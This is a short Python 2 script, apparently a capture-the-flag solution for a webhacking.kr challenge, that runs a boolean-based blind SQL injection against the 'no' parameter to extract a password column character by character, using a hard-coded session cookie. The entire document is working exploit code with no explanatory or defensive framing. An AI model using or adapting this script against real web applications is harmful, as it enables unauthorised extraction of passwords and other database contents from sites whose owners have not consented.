#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import urllib2
import time
 
session = "225b0794pin51g388pbvp9o7k3"
url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php"
 
for s in xrange(1,20):
    for char in xrange(0x20,0x7f):
        query = "?no=2%20and%20ascii(substr(pw,"+str(s)+",1))%20=%20"+str(char)
        req = urllib2.Request(url+query)
        req.add_header("Cookie","PHPSESSID="+session)
        if -1 != urllib2.urlopen(req).read().find("True"):
            print str(s) + " : "  + chr(char) +" ("+ hex(char) + ")"
        time.sleep(0.1)
